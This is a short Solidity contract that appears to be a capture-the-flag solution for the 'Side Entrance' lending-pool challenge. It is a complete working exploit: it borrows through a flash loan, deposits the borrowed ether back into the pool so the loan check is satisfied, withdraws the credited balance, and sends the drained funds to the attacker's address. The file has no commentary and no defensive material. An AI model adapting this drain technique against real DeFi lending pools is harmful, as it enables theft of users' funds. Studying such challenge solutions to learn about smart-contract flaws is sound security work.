// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "../side-entrance/SideEntranceLenderPool.sol";
contract SideA{
    SideEntranceLenderPool public pool;
    address payable owner; 
    constructor(address pool_address){
        pool = SideEntranceLenderPool(pool_address);
        owner = payable(msg.sender);
    }
    function attack(uint256 amount)external {
        pool.flashLoan(amount);
        pool.withdraw();
    }
    function execute() external payable{
        pool.deposit{value: address(this).balance}();
    }

    receive() external payable{
        owner.transfer(address(this).balance);
    }
}
